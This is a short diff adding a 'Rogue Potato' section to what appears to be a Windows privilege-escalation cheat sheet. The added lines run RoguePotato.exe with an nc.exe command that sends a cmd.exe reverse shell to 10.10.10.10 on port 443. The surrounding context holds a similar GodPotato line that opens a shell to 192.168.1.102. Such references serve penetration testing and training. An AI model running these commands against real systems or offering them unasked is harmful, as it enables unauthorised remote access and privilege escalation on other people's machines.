@@ -268,6 +268,12 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 Affected version:
 Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
 ```
+##### Rogue Potato
+```
+c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999(pick any port)
+# In some old versions you need to use the "-f" param
+c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
+```
 ##### PowerUp.ps1
 ```
 Service Enumeration:
